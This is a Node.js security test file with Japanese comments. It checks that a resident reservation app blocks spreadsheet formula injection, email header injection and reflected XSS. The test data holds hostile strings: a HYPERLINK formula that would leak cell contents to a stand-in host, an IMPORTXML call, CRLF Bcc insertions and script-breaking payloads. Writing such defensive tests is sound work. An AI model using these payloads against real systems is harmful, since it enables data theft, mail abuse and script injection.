'use strict';
// 侵入試験 面D：注入（docs/PENTEST.md 2.4）。画面の XSS は 07_xss.ui.test.js
const test = require('node:test');
const assert = require('node:assert/strict');
const { H, R, v, adminAuth, formulaCells } = require('./sec-helpers');

const OPEN = { residentBooking: true, residentLookup: true };
const FORMULAS = ['=HYPERLINK("http://e.example/?"&A1,"x")', '+1+1', '-1+1', '@SUM(1)', "'=1+1", '=IMPORTXML("http://e.example","//a")', '\t=1+1', ' =1+1'];

test('[PT-D3] =・+・-・@・\' で始まる値は、台帳・予約表のシートで数式にならず、文字のまま残る', async (t) => H.withEnv(t, { rules: OPEN }, async (env) => {
  const slots = ['S1', 'S2', 'S3', 'S4'];
  let i = 0;
  for (const f of FORMULAS) {
    const slotId = slots[i % 4], date = `2026-10-${String(26 + Math.floor(i / 4)).padStart(2, '0')}`;
    const room = f.slice(0, 20), building = f.slice(0, 20);
    // 住民の申込み（備考も）と、管理者の電話の登録（予約表のシートも作られる）
    await v(env, 'api_submitReservation', [env.req(R[0], { date, slotId, name: f.slice(0, 50), building, room, note: f })]);
    await v(env, 'api_admin_register', [adminAuth(), env.req(R[1], { date, slotId, name: f.slice(0, 50), building, room, channel: 'PHONE' })]);
    i++;
  }
  await v(env, 'api_admin_addBlock', [adminAuth(), { requestId: 'rq-block-formula', from: '2026-10-30', to: '2026-10-30', reason: 'その他', memo: FORMULAS[0], confirm: true }]);
  await v(env, 'api_admin_exportMonth', [adminAuth(), { month: '2026-10' }]);
  assert.deepEqual(formulaCells(env.host), [], 'シートに数式が書かれた');
  const names = env.table('reservations').rows.map((x) => x.name);
  for (const f of FORMULAS) assert.ok(names.includes(f.trim()) || names.includes(f), `「${f}」が文字のまま残っていない（${names.join(' | ')}）`);
}));

test('[PT-D4] メールの欄・名前に改行・Bcc・2つ目の宛先を入れても、宛先・件名を書き換えられない', async (t) => H.withEnv(t, { rules: OPEN }, async (env) => {
  const evilEmails = ['a@example.com\r\nBcc: x@example.net', 'a@example.com\nBcc:x@example.net', 'a@example.com,x@example.net', 'a@example.com;x@example.net', 'a@example.com x@example.net', '"x@example.net"<a@example.com>', 'a@example.com%0aBcc:x@example.net'];
  let i = 0;
  for (const email of evilEmails) {
    await v(env, 'api_submitReservation', [env.req(R[i % 12], { slotId: ['S1', 'S2', 'S3', 'S4'][i % 4], date: `2026-10-${26 + Math.floor(i / 4)}`, email, name: '山田\r\nBcc: x@example.net\r\n' })]);
    i++;
  }
  await env.host.run('job_processNotifications', [], { kind: 'trigger' });
  for (const m of env.host.outbox.concat(env.host.mailAttempts || [])) {
    const to = String(m.to || (m.args && m.args.to) || '');
    assert.ok(!/x@example\.net/.test(to), `宛先に攻撃者のアドレス: ${to}`);
    assert.ok(!/[\r\n]/.test(String(m.subject || '')), `件名に改行: ${JSON.stringify(m.subject)}`);
    assert.ok(!/[,;\s]/.test(to), `宛先が2つ以上になりうる: ${to}`);
  }
}));

test('[PT-D2] 住民の画面の URL の引数（?layout=・?page=）に入れたスクリプトが、HTML にそのまま入らない', async (t) => H.withEnv(t, async (env) => {
  const payloads = ['</script><script>window.__x=1</script>', '";window.__x=1;"', "';window.__x=1;'", 'list window.__x=1', '<img src=x onerror=__x=1>'];
  for (const p of payloads) {
    for (const key of ['layout', 'page', 'x']) {
      const g = await env.host.run('doGet', [{ parameter: { [key]: p }, parameters: { [key]: [p] }, queryString: `${key}=${encodeURIComponent(p)}` }], { kind: 'doGet', user: null });
      assert.ok(g.ok, `?${key}= で doGet が落ちた`);
      assert.ok(!g.value.content.includes(p), `?${key}=${p} が HTML にそのまま入った`);
      assert.ok(!g.value.content.includes('window.__x=1'), `?${key}= のスクリプトが HTML に入った`);
    }
  }
}));
